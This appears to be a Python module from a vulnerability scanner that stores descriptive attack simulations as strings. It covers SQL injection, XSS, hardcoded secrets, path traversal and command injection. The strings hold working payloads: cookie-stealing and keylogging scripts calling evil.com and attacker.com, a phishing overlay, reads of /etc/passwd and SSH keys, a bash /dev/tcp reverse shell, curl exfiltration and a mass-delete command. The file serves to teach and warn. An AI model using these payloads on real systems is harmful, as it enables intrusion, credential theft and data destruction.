"""
simulator.py
Generates safe, text-based attack simulations per vulnerability type.
Nothing here executes — all output is purely descriptive and educational.

XSS simulations now include realistic multi-context attack payloads.
"""

from typing import Dict


SIMULATIONS: Dict[str, Dict[str, str]] = {

    "SQL_INJECTION": {
        "payload": "' OR '1'='1' --",
        "result": (
            "Original: SELECT * FROM users WHERE id = '<user_input>'\n"
            "Injected: SELECT * FROM users WHERE id = '' OR '1'='1' --'\n"
            "  Condition is always TRUE — all rows are returned.\n"
            "Advanced: ' UNION SELECT username,password FROM admins --\n"
            "  Extracts admin credentials from a separate table."
        ),
        "impact": (
            "Authentication bypass — attacker gains access without a valid password. "
            "UNION-based injection can dump any table. "
            "Stacked queries (on some DBs) allow DELETE or DROP TABLE. "
            "Blind injection lets attackers exfiltrate data character by character."
        ),
    },

    "XSS": {
        "payload": (
            # Cookie theft (most common, highest impact)
            "<script>fetch('https://attacker.com/steal?c='+btoa(document.cookie))</script>"
        ),
        "result": (
            "The payload is injected into the page and executes when any user views it.\n\n"

            "Attack 1 — Session Hijacking:\n"
            "  <script>fetch('https://evil.com/?c='+btoa(document.cookie))</script>\n"
            "  Victim's session cookie base64-encoded and POSTed to attacker's server.\n\n"

            "Attack 2 — Keylogger Injection:\n"
            "  <script>document.addEventListener('keyup',e=>"
            "fetch('//evil.com?k='+encodeURIComponent(e.key)))</script>\n"
            "  Every keystroke (including passwords) silently logged.\n\n"

            "Attack 3 — Credential Harvesting (Phishing Overlay):\n"
            "  <script>document.body.innerHTML="
            "'<form action=\"https://evil.com\">Username:<input name=u>"
            "Password:<input type=password name=p><button>Login</button></form>'</script>\n"
            "  Replaces the real page with a fake login form.\n\n"

            "Attack 4 — CSRF via XHR (Authenticated Action):\n"
            "  <script>fetch('/api/transfer',{method:'POST',"
            "body:JSON.stringify({to:'attacker',amount:9999}),credentials:'include'})</script>\n"
            "  Performs a bank transfer on behalf of the victim using their active session.\n\n"

            "Attack 5 — Browser Fingerprinting + Redirect:\n"
            "  <script>window.location='https://evil.com/exploit?ua='+navigator.userAgent</script>\n"
            "  Silently redirects to an exploit kit page targeting the victim's browser version."
        ),
        "impact": (
            "Full session takeover — attacker can impersonate the user on any same-origin page. "
            "Password and 2FA credential theft via phishing overlay. "
            "Unauthorized transactions or data modifications via CSRF-through-XSS. "
            "Keylogging of sensitive inputs (banking PINs, API keys). "
            "Stored XSS persists in the database and attacks every user who visits the page — "
            "one injection can compromise thousands of accounts simultaneously."
        ),
    },

    "HARDCODED_SECRET": {
        "payload": "git log --all -p | grep -A2 -i 'api_key\\|secret\\|password'",
        "result": (
            "Secret found in plaintext inside source file or git history:\n"
            '  api_key = "sk-abc123verylongsecretkey"\n'
            "  Visible to: all developers, CI/CD logs, public forks, decompilation.\n\n"
            "Extraction methods:\n"
            "  1. git log --all -p | grep -i secret\n"
            "  2. trufflehog / gitleaks automated scanner\n"
            "  3. strings binary | grep -E '[A-Z0-9]{20,}'\n"
            "  4. GitHub search: 'org:yourorg api_key'"
        ),
        "impact": (
            "Unauthorized API access — attacker can make requests as your application. "
            "Financial charges from abused cloud/AI API keys. "
            "Data breach if the secret controls database or storage access. "
            "Supply chain risk — leaked keys persist in git history even after deletion. "
            "AWS key exposure triggers automated scanners within minutes of a public commit."
        ),
    },

    "PATH_TRAVERSAL": {
        "payload": "../../../../etc/passwd",
        "result": (
            "Original: fs.readFile('./uploads/' + filename)\n"
            "Injected: fs.readFile('./uploads/../../../../etc/passwd')\n\n"
            "Attack 1 — Linux credential file:\n"
            "  Payload: ../../../../etc/passwd\n"
            "  Result:  root:x:0:0:root:/root:/bin/bash | www-data:x:33:33...\n\n"
            "Attack 2 — Private key exfiltration:\n"
            "  Payload: ../../../../root/.ssh/id_rsa\n"
            "  Result:  -----BEGIN RSA PRIVATE KEY----- (full key returned)\n\n"
            "Attack 3 — App config / credentials:\n"
            "  Payload: ../../../../app/.env\n"
            "  Result:  DATABASE_URL=postgres://admin:pass@db:5432/prod\n"
            "           JWT_SECRET=supersecretkey123\n\n"
            "Attack 4 — Web server config:\n"
            "  Payload: ../../../../etc/nginx/nginx.conf\n"
            "  Result:  Full server configuration exposed, revealing internal routes and upstreams."
        ),
        "impact": (
            "Arbitrary file read — any file the server process can access, including "
            "/etc/passwd, /etc/shadow, private SSH keys, .env files, and source code. "
            "Authentication bypass if session tokens or JWT secrets are read. "
            "Server takeover if SSH private key or cloud credentials are exfiltrated. "
            "Chained with file write: attacker can overwrite cron jobs or SSH authorized_keys."
        ),
    },

    "COMMAND_INJECTION": {
        "payload": "127.0.0.1; cat /etc/passwd",
        "result": (
            "Original: exec('ping ' + userInput)\n"
            "Injected: exec('ping 127.0.0.1; cat /etc/passwd')\n\n"
            "Attack 1 — Chained command (semicolon):\n"
            "  Payload: 127.0.0.1; cat /etc/shadow\n"
            "  Result:  Ping runs, then /etc/shadow is printed — hashed passwords exposed.\n\n"
            "Attack 2 — Silent reverse shell (background):\n"
            "  Payload: 127.0.0.1 & bash -i >& /dev/tcp/attacker.com/4444 0>&1 &\n"
            "  Result:  Attacker receives an interactive shell with server privileges.\n\n"
            "Attack 3 — Data exfiltration via curl:\n"
            "  Payload: x | curl -d @/etc/passwd https://attacker.com/collect\n"
            "  Result:  /etc/passwd POSTed to attacker's server silently.\n\n"
            "Attack 4 — Ransomware trigger:\n"
            "  Payload: x && find / -name '*.js' -delete && echo pwned\n"
            "  Result:  All JS files on the server deleted."
        ),
        "impact": (
            "Full Remote Code Execution (RCE) — highest severity vulnerability class. "
            "Attacker runs arbitrary OS commands as the web server user. "
            "Can escalate to root via local privilege escalation exploits. "
            "Reverse shell gives persistent interactive access. "
            "Data exfiltration, ransomware deployment, or complete server takeover possible. "
            "No recovery without full server rebuild if root is compromised."
        ),
    },
}

DEFAULT_SIMULATION = {
    "payload": "N/A",
    "result": "No simulation available for this vulnerability type.",
    "impact": "Potential security risk — review the flagged code carefully.",
}


def get_simulation(vuln_type: str) -> Dict[str, str]:
    return SIMULATIONS.get(vuln_type, DEFAULT_SIMULATION)
